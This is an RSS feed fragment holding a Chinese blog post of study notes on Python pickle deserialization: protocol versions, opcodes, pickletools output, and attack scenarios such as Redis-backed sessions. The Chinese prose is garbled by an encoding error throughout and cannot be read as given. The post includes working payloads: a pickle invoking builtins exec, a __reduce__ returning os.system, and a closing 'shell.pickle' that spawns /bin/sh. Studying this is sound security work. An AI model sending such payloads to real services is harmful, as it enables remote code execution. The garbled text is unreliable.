&lt;p>å¼€å­¦äº†ï¼Œä¸æ‘†çƒ‚ä»Žæˆ‘åšèµ·&lt;/p></description></item><item><title>ååºåˆ—åŒ–ä¸“é¢˜ç¬”è®°Â·å£¹Â·pythonç¯‡</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h2>
&lt;p>åœ¨pythonä¸­æœ‰å¥½å‡ ä¸ªå†…ç½®æ¨¡å—éƒ½å¯ä»¥å¹²åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–è¿™ä¸ªäº‹ï¼Œæ¯”å¦‚&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>ï¼Œè€Œæœ¬æ–‡åŽé¢æ¶‰åŠåˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œè‹¥æ— ç‰¹æ®Šè¯´æ˜Žï¼ŒæŒ‡çš„éƒ½æ˜¯pickleã€‚&lt;/p>
&lt;p>pickleåŽçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å­—èŠ‚æµå­˜å‚¨ï¼Œèƒ½è¡¨ç¤ºpythonå‡ ä¹Žæ‰€æœ‰çš„ç±»åž‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»åž‹ï¼‰ï¼Œæ¯”å¦‚&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> ã€ &lt;code>True&lt;/code> å’Œ &lt;code>False&lt;/code>&lt;/li>
&lt;li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°&lt;/li>
&lt;li>strã€byteã€bytearray&lt;/li>
&lt;li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> å±žæ€§å€¼æˆ– &lt;code>__getstate__()&lt;/code> å‡½æ•°çš„è¿”å›žå€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰&lt;/li>
&lt;/ul>
&lt;p>å½“ç„¶ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æŽ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥ã€‚&lt;/p>
&lt;p>å¯¹äºŽä¸€ä¸ªObjectï¼Œå¯ä»¥é€šè¿‡é‡å†™&lt;code>object.__reduce__()&lt;/code>å‡½æ•°ï¼Œä½¿å…¶è¢«åºåˆ—åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼›æ­¤å‡½æ•°ä¼šè¿”å›žä¸€ä¸ª&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®žæ˜¯æž„é€ å‡½æ•°ï¼‰ã€‚&lt;/p>
&lt;p>pickleçš„å¸¸ç”¨æ–¹æ³•æœ‰dumps(), loads()å’Œdump(), load()ï¼Œä¸å¸¦sçš„éœ€è¦çš„å‚æ•°æ˜¯æ–‡ä»¶å¥æŸ„ï¼Œè€Œå¸¦sçš„æ‰€éœ€è¦çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚&lt;/p>
&lt;p>è¯´åˆ°pickleä¸å¾—ä¸è°ˆçš„æ˜¯opcodeï¼Œå³&lt;u>PVM(python virtual machine)&lt;/u>çš„æ“ä½œç ï¼Œå®ƒå¯ä»¥è¢«PVMçš„è§£æžå¼•æ“Žè§£é‡Šå¤„ç†ã€‚ç›®å‰opcodeæœ‰å¤šä¸åŒçš„å®žçŽ°ç‰ˆæœ¬ï¼ˆä½†å‘ä¸‹å…¼å®¹ï¼‰ï¼Œå…¶ä¸­py2å’Œpy3åºåˆ—åŒ–çš„ç»“æžœæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šåè®®ç‰ˆæœ¬ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># python3è¾“å‡º protocol&amp;lt;=5&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># python2è¾“å‡º protocal&amp;lt;=2&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">p1&lt;/span>
&lt;span style="color:#111">I1&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#111">p2&lt;/span>
&lt;span style="color:#111">I2&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">ï¿½&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>0å·ç‰ˆæœ¬åºåˆ—åŒ–çš„ç»“æžœçœ‹èµ·æ¥å¯è¯»æ€§å¾ˆå¼º éƒ½æ˜¯å¯è§†çš„å­—ç¬¦ï¼Œæ“ä½œç ä¹Ÿæ¯”è¾ƒç›´æŽ¥åœ°æš´éœ²å‡ºæ¥ï¼Œé‡ç‚¹å…³æ³¨å‡ ä¸ªï¼š&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>ä½¿ç”¨**&lt;u>pickletools&lt;/u>**å¯ä»¥å°†opcodeè½¬åŒ–ä¸ºè‚‰çœ¼å¯è¯»å–çš„å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å¯ä»¥åˆ©ç”¨çš„æ–¹å‘æ€è·¯">å¯ä»¥åˆ©ç”¨çš„æ–¹å‘&amp;amp;æ€è·¯&lt;/h2>
&lt;p>pickleçš„åº”ç”¨åœºæ™¯å…¶å®žå¾ˆå¹¿æ³›&lt;/p>
&lt;ul>
&lt;li>è§£æžè®¤è¯token, sessionæ—¶ï¼›å‚è§ï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">æŽŒé˜…iReaderæŸç«™Pythonæ¼æ´žæŒ–æŽ˜&lt;/a>ï¼ˆä¸€ä¸ªredis+pythonååºåˆ—åŒ–çš„æ —å­&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleåŽå­˜å‚¨æˆç£ç›˜æ–‡ä»¶&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleåŽåœ¨ç½‘ç»œä¸­ä¼ è¾“&lt;/li>
&lt;li>å¯èƒ½ä¼šé€šè¿‡å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼›å‚è§ï¼š&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmapçš„ä»£ç æ‰§è¡Œæ¼æ´ž&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œè¯´ä¸€ä¸‹ç¬¬ä¸€ç‚¹ï¼Œflaské…åˆredisåœ¨æœåŠ¡ç«¯å­˜å‚¨sessionï¼ˆä»¥pickleåºåˆ—åŒ–å½¢å¼è¿›è¡Œå­˜å‚¨ï¼‰ï¼Œå¦‚æžœé€šè¿‡cookieè¿›è¡Œè¯·æ±‚session_idæ—¶ï¼Œsessionç§çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ã€‚ç†è®ºä¸Šæ²¡é—®é¢˜ï¼Œä½†å¦‚æžœå‡ºçŽ°redisçš„æœªæŽˆæƒè®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå·±è®¾è®¡æ¶æ„çš„sessionï¼Œç„¶åŽå†è®¾ç½®cookieåŽ»è¯·æ±‚sessionæ—¶ï¼Œæˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œè¾¾åˆ°äº†rceçš„ç›®çš„ã€‚&lt;/p>
&lt;p>æž„é€ ååºåˆ—åŒ–çš„payloadç¦»ä¸å¼€&lt;code>__reduce__&lt;/code>è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆä¸Šæ–‡ç®€å•çš„æåˆ°è¿‡ï¼‰ï¼Œå®ƒæ˜¯æ–°å¼ç±»ï¼ˆå†…ç½®ç±»ï¼‰ç‰¹æœ‰çš„æ–¹æ³•ï¼ˆå…³äºŽæ›´å¤špythonå…ƒç±»ç›¸å…³çš„çŸ¥è¯†å¯ä»¥å‚è€ƒstackoverflowçš„è¿™ç¯‡å¸–å­ï¼š&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨python2æœ‰ä¸¤ç§å£°æ˜Žç±»çš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å®žä¾‹åŒ–çš„å¯¹è±¡æ€§è´¨æ˜¯ä¸åŒçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3ä¸­æ¶ˆé™¤äº†ä¸¤è€…çš„åŒºåˆ«ï¼Œè¡¨çŽ°ä¸ºç¬¬äºŒç§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>å›žåˆ°å…³äºŽ&lt;code>__reduce__&lt;/code>çš„é—®é¢˜ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª &lt;code>__reduce__&lt;/code> æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨&lt;code>__reduce__&lt;/code> ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ã€‚æŒ‡å®šçš„å…³é”®å°±åœ¨äºŽè¯¥æ–¹æ³•çš„è¿”å›žå€¼ä¸Šï¼šä¸€ä¸ª&lt;code>callable&lt;/code>å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯&lt;code> ([para1, para2, ...])[, ...])&lt;/code>ï¼Œè¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼›æœ€ç®€å•çš„ä¾‹å­æ˜¯&lt;code>return (os.system, ('ls',))&lt;/code>ã€‚&lt;code>__reduce__&lt;/code> æ–¹æ³•ä¸Žopcodeä¸­çš„RæŒ‡ä»¤ç å…³ç³»å¯†åˆ‡ï¼Œå¯ä»¥è¯´PVMçš„RæŒ‡ä»¤ç å°±æ˜¯&lt;code>__reduce__&lt;/code>çš„è¿”å›žå€¼çš„ä¸€ä¸ªåº•å±‚å®žçŽ°ã€‚&lt;/p>
&lt;h3 id="æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­">æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
